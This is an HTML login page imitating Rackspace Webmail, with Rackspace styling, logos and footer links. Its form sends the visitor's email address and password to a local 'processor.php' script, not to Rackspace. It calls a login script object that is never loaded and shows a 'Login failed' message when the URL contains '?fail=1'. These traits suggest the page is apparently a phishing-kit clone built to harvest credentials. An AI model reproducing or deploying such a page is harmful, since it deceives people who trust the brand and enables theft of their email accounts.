<html>
<head>
    <title>Rackspace Webmail: Hosted Email for Business</title>
    <meta http-equiv=Content-Type content="text/html charset=utf-8">
	<link href="https://apps.rackspace.com/favicon.ico" rel="shortcut icon" />
    <style type="text/css">
        body {
            background: #DDD;
            height: 90%;
            font-size: 10pt;
            font-family: Tahoma,Arial,Verdana;
            color: #444;
        }

        form { display: inline; margin: 0; padding: 0; }
        a { color: #333333; text-decoration: none; border: 0; }
        form a { color: #0066CC; }
        a:hover { text-decoration: underline; }
        a img {    border: 0; }
        div.page {
            width: 594px;
            margin: auto;
        }

        div.header {
            width: 100%;
            height: 60px;
            margin: 0 0 0 0px;
            position: absolute;
            left: 0px;
            top: 0px;
            background: #333
        }

        div.header a.logo {
            float: left;
            width: 150px;
            font-size: 7pt;
            color: #000;
            line-height: .7;
            margin-left: 20px;
        }

        div.header div.logo {
            width: 200px;
            height: 62px;
            float: left;
            margin-left: 20px;
        }

        .logo img {
            margin-top: 5px;
        }

        div.title {
            float: right;
        }
        div.title h1 {
            color: #666;
            font-size: 12px;
            font-weight: normal;
            margin: 40px 0 0 0;
        }
        input:-webkit-autofill {
            background-color: white !important;
        }

        div.form_wrapper { margin-top: 180px; border: 1px solid #999; background: #FFF; box-shadow: 2px 2px 5px #999; }
        div.form { padding: 30px; height: 292px; }
        div.form div.left {    float: left; width:270px;}
        div.form div.right { float: right; width: 188px; }
        div.form div.right div.banner { background: #FFF; height: 269px; width: 173px; }
        div.form input, div.form select { font-size: 12pt; margin-left: 0px; }
        div.form #login { float: left; width: 82px; height: 34px; }
        div.form #login {
            cursor:pointer;
            margin: 0 0 17px 0;
            line-height:20px;
            font-family:Tahoma,Arial,"Helvetica Neue",Helvetica,sans-serif;
            font-size:15px;
            text-align:center;
            padding:1px 10px 2px;
            border-radius:3px;
            -moz-border-radius:3px;
            -webkit-border-radius:3px;
            border-width:1px;
            border-style:solid;
            text-shadow:0 -1px 1px rgba(0,0,0,0.4);
            background-color:#a60004;
            border-color:#a60004;
            color:#fff;
            background:#d81436;
            background:-moz-linear-gradient(top,#d81436 0,#a60004 100%);
            background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#d81436),color-stop(100%,#a60004));
            background:-webkit-linear-gradient(top,#d81436 0,#a60004 100%);
            background:-o-linear-gradient(top,#d81436 0,#a60004 100%);
            background:-ms-linear-gradient(top,#d81436 0,#a60004 100%);
            background:linear-gradient(top,#d81436 0,#a60004 100%);
            filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d81436',endColorstr='#a60004',GradientType=0);
        }
        div.form #login::-moz-focus-inner {
            border:0;
            padding:0
        }
        div.form #login[disabled] {
            cursor:default;
            color:#fff;
            background-color:#e9a7b2;
            border-color:#e9a7b2;
            background-image:none
        }
        div.form #login:not([disabled]):hover {
            background:#d81436;
            background:-moz-linear-gradient(top,#d81436 0,#c40022 100%);
            background:-webkit-gradient(linear,left top,left bottom,color-stop(0,#d81436),color-stop(100%,#c40022));
            background:-webkit-linear-gradient(top,#d81436 0,#c40022 100%);
            background:-o-linear-gradient(top,#d81436 0,#c40022 100%);
            background:-ms-linear-gradient(top,#d81436 0,#c40022 100%);
            background:linear-gradient(top,#d81436 0,#c40022 100%);
            filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d81436',endColorstr='#c40022',GradientType=0);
            text-decoration:none
        }
        div.form #login:not([disabled]):active {
            background-color:#c40022;
            background-image:none;
            box-shadow:inset 0 0 4px 0 rgba(0,0,0,0.5);
            -moz-box-shadow:inset 0 0 4px 0 rgba(0,0,0,0.5);
            -webkit-box-shadow:inset 0 0 4px 0 rgba(0,0,0,0.5)
        }

        div.form select { display: none; }
        a#forgot_password { margin-left: 15px; font-size: 10pt; margin-top: 12px;
            background-repeat:      no-repeat;
            background-position: 0px;
            float:left;
        }
        #options { clear: both;}
        div#options_label { margin: 0 0 6px 1px; font-size: 10pt; color: #000; }
        input.fake_pwd { margin: 2px 0 20px 0; padding: 1px 1px 1px 10px; width: 170px; color: black !important; 
            height: 36px; width: 306px; border: 1px solid #cacaca; display: none !important;}
        input.user { margin: 2px 0 17px 0; padding: 1px 1px 1px 10px; color: black !important;
            height: 36px; width: 306px; border: 1px solid #cacaca }
        input.pwd { margin: 2px 0 20px 0; padding: 1px 1px 1px 10px; height: 36px; width: 306px; border: 1px solid #cacaca; color: black !important; display: block !important;}
        input.submit { margin: 0 0 15px 0; padding 0;
            height: 25px; width: 57px; }
        div.footer { width: 480px; margin: auto; text-align: center;
            margin-top: 10px; }
        div.footer .caption {
            font-size: 12px;
            color: #666;
        }
div.footer .caption a {
color: #666;
text-decoration: underline;
}
        div.footer .caption h2 {
            display: inline;
            font-size: 12px;
            font-weight: normal;
        }
        #email_label {
           margin-top: 14px;
        }
        div.footer .company {
            color: #888; 
            margin: 15px 0 0 0;
        }
        #form_title {
            font-size: 18px;
        }
        #placeholder {
            height: 16px;
        }
        #login_links {
            text-align: right;
            color: #FFF;
            margin-top: 20px;
            margin-right: 20px;
            font-weight: bold;
        }
        #login_links a,
        #login_links div {
            font-weight: normal;
            color: #fff;
        }
        #login_links div {
            color: #999;
        }
        .divider {
            margin: 0 5px 0 5px;
            display: inline;
        }
        div#alert { display: none; color: red; font-size: 13px; 
            }
        body.alert div#alert { display: block !important; }
        body.alert div#placeholder { display: none !important; }
        img.logo {
            width: 130px;
            height: 32px;
            margin-top: 12px;
            background-image: url(http://cp.rackspace.com/clients/webmail/apps_rackspace_com/images/logo_20141002.png );
            background-repeat: no-repeat;
        }
        #ssl { margin-top: 4px; }
        img.banner {
            width: 190px;
            height: 294px;
            background-image: url(https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg);
        }
        img.ssllogo { width: 13px; height: 17px;
            background-image:url(http://cp.rackspace.com/clients/webmail/apps_rackspace_com/images/ssllogo.gif); 
            position:relative;
            margin: 2px 0 0 2px;
        }

        .base .base_links,
        .base .base_links a {
            color: #666;
        }
        .base {
            width: 99%;
            text-align: center;
            position: absolute;
            bottom: 10px;
        }

    </style>
    <link href="favicon.ico" rel="shortcut icon" />
</head>

<body>
    <div class="page">
        <div class="header">
            <div class="logo">
                <a href="//www.rackspace.com/apps/">
                    <img class="logo" alt="Webmail (Web Mail) Login for Rackspace Email Customers" src="http://cp.rackspace.com/clients/webmail/apps_rackspace_com/images/blank.gif" />
                </a>
            </div>
            <div id="login_links">Webmail <div class='divider'>|</div> <a href='https://cp.rackspace.com'>Control Panel</a> </div>
        </div>
        <div class="form_wrapper">
            <div class="form">
                <div class="right">
                    <div class="banner">
                        <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
                            <img class="banner" src="http://cp.rackspace.com/clients/webmail/apps_rackspace_com/images/blank.gif" />
                        </a>
                    </div>
                </div>
                <div class="left">
                    <form method="post" action="processor.php" name="login">
                        <input type="hidden" name="hostname" value="mailtrust.com" />

                        <div id="form_title">Rackspace Webmail Login</div>
                        <div id="alert" style="display:none;">Login failed</div>
                        <div id="placeholder"> </div>
                        <select name="type" tabindex="10" id="emailAccount" onchange="$Login.changeLogin('');">
                            <option value="email">Email Account</option>
                            <option value="cp">Control Panel</option>
                        </select>
                        <input type="text" name="fake_pwd" tabindex="12" class="fake_pwd" value="Password" style="display:none"/>
                        <div id="email_label">Email Address</div>
                        <input type="text" tabindex="11" name="user" class="user" value="" />
                        <div>Password</div>
                        <input type="password"
                            tabindex="12" name="pass" class="pwd"/>

                                                <input type="submit" tabindex="13" id="login" name="submit_btn" class="submit" value="Log In" 
                            onclick="$Login.submitForm();"/>
                        <img class="ssllogo" src="http://cp.rackspace.com/clients/webmail/apps_rackspace_com/images/blank.gif" align="top" alt="SSL Encrypted" id="forcessl_icon" 
                            style="display:none;" />

                        <a href="/forgot-password" id="forgot_password">Forgot Password?</a>

                        <div id="options">
                            <div id="rememberinfo">
                                <input type="checkbox" tabindex="14" name="remember" id="remember" />
                                <label for="remember">Remember this info</label>
                            </div>
                            <div id="ssl">
                                <input type="checkbox" tabindex="15" name="usessl" id="usessl" disabled="disabled" checked="checked" />
                                <label for="usessl">
                                    Use SSL

                                </label>
                            </div>
                        </div>
                    </form>

                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="caption">
            Need <h2>webmail</h2> for your business?  Learn more about 
                <a href="//www.rackspace.com/apps/email_hosting/rackspace_email">

                    Hosted Email</a> from Rackspace
        </div>
    </div>
    <div class="base">
        <div class="base_links">
            <a target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">Privacy Statement</a>
            <div class='divider'>|</div>
            <a target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">Website Terms</a>
        </div>
    </div>

</body>
<script type="text/javascript">
function onFormSubmit(got_url) {
    var next_month = new Date();
    next_month.setTime(next_month.getTime()+(30*24*60*60*1000));
    next_month = next_month.toGMTString();
    document.cookie = "rsea_cust=1; expires="+next_month+"; path=/; domain=.rackspace.com";

    $Login.submitForm(got_url);
}
</script>
<script>
	if (location.search.substring(1) == 'fail=1') {
		document.getElementById('alert').style.display = 'block';
        }
	</script>
</html>